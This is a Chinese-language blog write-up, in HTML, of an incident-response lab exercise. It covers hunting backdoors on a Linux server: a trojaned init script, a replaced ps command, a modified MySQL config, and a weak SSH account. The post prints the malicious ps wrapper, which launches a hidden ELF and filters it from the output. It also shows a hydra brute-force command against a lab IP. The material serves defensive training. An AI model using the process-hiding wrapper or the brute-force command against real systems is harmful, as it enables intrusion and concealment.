@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="简介123456账户：root 密码：p@ssw0rd1231.找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin,sbin,...）提交；2.找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；3.找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；4.找出被黑客修改的服务配置文件，将文件的md">
+<meta property="og:type" content="article">
+<meta property="og:title" content="应急响应-服务器后门程序排查">
+<meta property="og:url" content="https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/index.html">
+<meta property="og:site_name" content="Liangmo_sec">
+<meta property="og:description" content="简介123456账户：root 密码：p@ssw0rd1231.找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin,sbin,...）提交；2.找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；3.找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；4.找出被黑客修改的服务配置文件，将文件的md">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419120743623.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419121232728.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419122118808.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419122343746.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419122619198.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419122654866.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419123949498.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419135049753.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419133909208.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419134828931.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419135448581.png">
+<meta property="article:published_time" content="2025-04-19T03:30:00.000Z">
+<meta property="article:modified_time" content="2025-04-19T05:56:13.129Z">
+<meta property="article:author" content="凉墨">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419120743623.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>应急响应-服务器后门程序排查</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-SSH%E6%9C%8D%E5%8A%A1%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&text=应急响应-服务器后门程序排查"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&is_video=false&description=应急响应-服务器后门程序排查"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=应急响应-服务器后门程序排查&body=Check out this article: https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&title=应急响应-服务器后门程序排查"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&name=应急响应-服务器后门程序排查&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/&t=应急响应-服务器后门程序排查"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%BE%E5%87%BA%E9%BB%91%E5%AE%A2%E6%A4%8D%E5%85%A5%E5%88%B0%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%B9%B6%E5%B0%86%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BAFlag%E5%80%BC%EF%BC%88%E8%8B%A5%E5%AD%98%E5%9C%A8%E5%A4%9A%E4%B8%AA%E6%8F%90%E4%BA%A4%E6%97%B6%E4%BD%BF%E7%94%A8%E8%8B%B1%E6%96%87%E9%80%97%E5%8F%B7%E9%9A%94%E5%BC%80%EF%BC%8C%E4%BE%8B%E5%A6%82bin-sbin-%E2%80%A6%EF%BC%89%E6%8F%90%E4%BA%A4%EF%BC%9B"><span class="toc-number">1.1.</span> <span class="toc-text">1.找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin,sbin,…）提交；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%BE%E5%87%BA%E8%A2%AB%E9%BB%91%E5%AE%A2%E4%BF%AE%E6%94%B9%E7%9A%84%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E6%8C%87%E4%BB%A4%EF%BC%8C%E5%B9%B6%E5%B0%86%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E6%8C%87%E4%BB%A4%E9%87%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E5%8D%95%E8%AF%8D%E4%BD%9C%E4%B8%BAFlag%E5%80%BC%E6%8F%90%E4%BA%A4%EF%BC%9B"><span class="toc-number">1.2.</span> <span class="toc-text">2.找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%89%BE%E5%87%BA%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%9B%BF%E6%8D%A2%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E4%BD%9C%E4%B8%BAFlag%E5%80%BC%E6%8F%90%E4%BA%A4%EF%BC%9B"><span class="toc-number">1.3.</span> <span class="toc-text">3.找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%89%BE%E5%87%BA%E8%A2%AB%E9%BB%91%E5%AE%A2%E4%BF%AE%E6%94%B9%E7%9A%84%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%86%E6%96%87%E4%BB%B6%E7%9A%84md5%E5%80%BC%E5%89%8D%E5%9B%9B%E4%BD%8D%E4%BD%9C%E4%B8%BAFlag%E5%80%BC%E6%8F%90%E4%BA%A4%EF%BC%9B"><span class="toc-number">1.4.</span> <span class="toc-text">4.找出被黑客修改的服务配置文件，将文件的md5值前四位作为Flag值提交；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%89%BE%E5%87%BA%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%B4%A6%E5%8F%B7%EF%BC%8C%E5%B0%86%E8%AF%A5%E8%B4%A6%E5%8F%B7%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E5%AF%86%E7%A0%81%E4%BD%9C%E4%B8%BAFlag%E5%80%BC-%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E4%B9%8B%E9%97%B4%E7%94%A8%E8%8B%B1%E6%96%87%E5%86%92%E5%8F%B7%E9%9A%94%E5%BC%80%EF%BC%8C%E4%BE%8B%E5%A6%82%EF%BC%9Aroot-toor-%E6%8F%90%E4%BA%A4%E3%80%82"><span class="toc-number">1.5.</span> <span class="toc-text">5.找出系统中的弱口令账号，将该账号的用户名及密码作为Flag值(用户名和密码之间用英文冒号隔开，例如：root:toor)提交。</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        应急响应-服务器后门程序排查
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">凉墨</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-19T03:30:00.000Z" class="dt-published" itemprop="datePublished">2025-04-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">账户：root 密码：p@ssw0rd123</span><br><span class="line">1.找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin,sbin,...）提交；</span><br><span class="line">2.找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；</span><br><span class="line">3.找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；</span><br><span class="line">4.找出被黑客修改的服务配置文件，将文件的md5值前四位作为Flag值提交；</span><br><span class="line">5.找出系统中的弱口令账号，将该账号的用户名及密码作为Flag值(用户名和密码之间用英文冒号隔开，例如：root:toor)提交。</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin-sbin-…）提交；"><a href="#1-找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin-sbin-…）提交；" class="headerlink" title="1.找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin,sbin,…）提交；"></a>1.找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin,sbin,…）提交；</h3><p><code>history</code></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419120743623.png" alt="image-20250419120743623"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4  cat /etc/init.d/cpuspeed </span><br><span class="line">5  cat /home/guest/.zshrc_history </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>cpuspeed在&#x2F;etc&#x2F;init.d(Linux的开机自启目录下)</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419121232728.png" alt="image-20250419121232728"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cpuspeed文件 =&gt; 调用/home/guest/.zshrc_history =&gt; 执行/home/redflag/.shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419122118808.png" alt="image-20250419122118808"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419122343746.png" alt="image-20250419122343746"></p>
+<blockquote>
+<p>在&#x2F;home&#x2F;guest目录下发现ps文件，使用file命令查看文件类型为ELF 64-bit的可执行文件，我们为其赋予执行权限，发现为系统的ps命令，当使用环境变量执行ps命令的时候，发现了异常。其在&#x2F;usr&#x2F;bin&#x2F;ps文件中执行centos_core.elf文件发现权限不够。</p>
+</blockquote>
+<p>显然可知 原环境变量的ps已经被替换了</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419122619198.png" alt="image-20250419122619198"><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419122654866.png" alt="image-20250419122654866"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在/usr/bin/ps命令下发现这里执行了centos_core.elf文件，而elf文件大多数都是由msfvenom生成的反弹shell木马</span><br><span class="line">故恶意程序为centos_core.elf</span><br><span class="line">.shell.elf,centos_core.elf</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；"><a href="#2-找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；" class="headerlink" title="2.找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；"></a>2.找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；</h3><blockquote>
+<p>据题1得，系统指令ps被替换 最后一个单词为bash</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/centos_core.elf &amp; /.hide_command/ps |grep -v <span class="string">&quot;shell&quot;</span> | grep -v <span class="string">&quot;centos_core&quot;</span> | grep <span class="string">&quot;bash&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；"><a href="#3-找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；" class="headerlink" title="3.找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；"></a>3.找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；</h3><blockquote>
+<p>据题1得，系统指令ps被替换绝对路径为&#x2F;usr&#x2F;bin&#x2F;ps</p>
+</blockquote>
+<h3 id="4-找出被黑客修改的服务配置文件，将文件的md5值前四位作为Flag值提交；"><a href="#4-找出被黑客修改的服务配置文件，将文件的md5值前四位作为Flag值提交；" class="headerlink" title="4.找出被黑客修改的服务配置文件，将文件的md5值前四位作为Flag值提交；"></a>4.找出被黑客修改的服务配置文件，将文件的md5值前四位作为Flag值提交；</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419123949498.png" alt="image-20250419123949498"></p>
+<blockquote>
+<p>使用ss -tnl查看本机开放端口，当我们发现3306端口对外监听，</p>
+<p>查看&#x2F;etc&#x2F;my.cnf文件，</p>
+<p>发现添加配置secure_file_priv的值为&#x2F;var&#x2F;www&#x2F;html，而该配置项控制的是mysql是否能读写系统文件。故而修改的配置文件为my.cnf</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5sum /etc/my.cnf</span><br><span class="line">a870a4cdbf58a62956fab97aa3f60daa  /etc/my.cnf</span><br><span class="line">a870</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-找出系统中的弱口令账号，将该账号的用户名及密码作为Flag值-用户名和密码之间用英文冒号隔开，例如：root-toor-提交。"><a href="#5-找出系统中的弱口令账号，将该账号的用户名及密码作为Flag值-用户名和密码之间用英文冒号隔开，例如：root-toor-提交。" class="headerlink" title="5.找出系统中的弱口令账号，将该账号的用户名及密码作为Flag值(用户名和密码之间用英文冒号隔开，例如：root:toor)提交。"></a>5.找出系统中的弱口令账号，将该账号的用户名及密码作为Flag值(用户名和密码之间用英文冒号隔开，例如：root:toor)提交。</h3><blockquote>
+<p>ss -tnl查看网站开放的端口，发现ftp和ssh都是对外开放</p>
+<p>爆破题有些无语</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419135049753.png" alt="image-20250419135049753"></p>
+<p><code>cat /etc/shadow</code></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419133909208.png" alt="image-20250419133909208"></p>
+<p><code> hydra -l admin -p /usr/share/wordlists/rockyou.txt ssh://192.168.36.151 -t 50 -f</code></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419134828931.png" alt="image-20250419134828931"><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20250419135448581.png" alt="image-20250419135448581"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">只有rockyou.txt中存在，且爆破中，正确密码也不一定成功爆破出来</span><br><span class="line">admin:aaaaab</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/links/">Links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%BE%E5%87%BA%E9%BB%91%E5%AE%A2%E6%A4%8D%E5%85%A5%E5%88%B0%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%B9%B6%E5%B0%86%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BAFlag%E5%80%BC%EF%BC%88%E8%8B%A5%E5%AD%98%E5%9C%A8%E5%A4%9A%E4%B8%AA%E6%8F%90%E4%BA%A4%E6%97%B6%E4%BD%BF%E7%94%A8%E8%8B%B1%E6%96%87%E9%80%97%E5%8F%B7%E9%9A%94%E5%BC%80%EF%BC%8C%E4%BE%8B%E5%A6%82bin-sbin-%E2%80%A6%EF%BC%89%E6%8F%90%E4%BA%A4%EF%BC%9B"><span class="toc-number">1.1.</span> <span class="toc-text">1.找出黑客植入到系统中的二进制木马程序，并将木马程序的名称作为Flag值（若存在多个提交时使用英文逗号隔开，例如bin,sbin,…）提交；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%BE%E5%87%BA%E8%A2%AB%E9%BB%91%E5%AE%A2%E4%BF%AE%E6%94%B9%E7%9A%84%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E6%8C%87%E4%BB%A4%EF%BC%8C%E5%B9%B6%E5%B0%86%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E6%8C%87%E4%BB%A4%E9%87%8C%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E5%8D%95%E8%AF%8D%E4%BD%9C%E4%B8%BAFlag%E5%80%BC%E6%8F%90%E4%BA%A4%EF%BC%9B"><span class="toc-number">1.2.</span> <span class="toc-text">2.找出被黑客修改的系统默认指令，并将被修改的指令里最后一个单词作为Flag值提交；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%89%BE%E5%87%BA%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%9B%BF%E6%8D%A2%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%8C%87%E4%BB%A4%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E4%BD%9C%E4%B8%BAFlag%E5%80%BC%E6%8F%90%E4%BA%A4%EF%BC%9B"><span class="toc-number">1.3.</span> <span class="toc-text">3.找出被黑客替换的系统指令，并将其绝对路径作为Flag值提交；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%89%BE%E5%87%BA%E8%A2%AB%E9%BB%91%E5%AE%A2%E4%BF%AE%E6%94%B9%E7%9A%84%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%86%E6%96%87%E4%BB%B6%E7%9A%84md5%E5%80%BC%E5%89%8D%E5%9B%9B%E4%BD%8D%E4%BD%9C%E4%B8%BAFlag%E5%80%BC%E6%8F%90%E4%BA%A4%EF%BC%9B"><span class="toc-number">1.4.</span> <span class="toc-text">4.找出被黑客修改的服务配置文件，将文件的md5值前四位作为Flag值提交；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%89%BE%E5%87%BA%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%B4%A6%E5%8F%B7%EF%BC%8C%E5%B0%86%E8%AF%A5%E8%B4%A6%E5%8F%B7%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E5%AF%86%E7%A0%81%E4%BD%9C%E4%B8%BAFlag%E5%80%BC-%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E4%B9%8B%E9%97%B4%E7%94%A8%E8%8B%B1%E6%96%87%E5%86%92%E5%8F%B7%E9%9A%94%E5%BC%80%EF%BC%8C%E4%BE%8B%E5%A6%82%EF%BC%9Aroot-toor-%E6%8F%90%E4%BA%A4%E3%80%82"><span class="toc-number">1.5.</span> <span class="toc-text">5.找出系统中的弱口令账号，将该账号的用户名及密码作为Flag值(用户名和密码之间用英文冒号隔开，例如：root:toor)提交。</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2025/04/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E6%8E%92%E6%9F%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
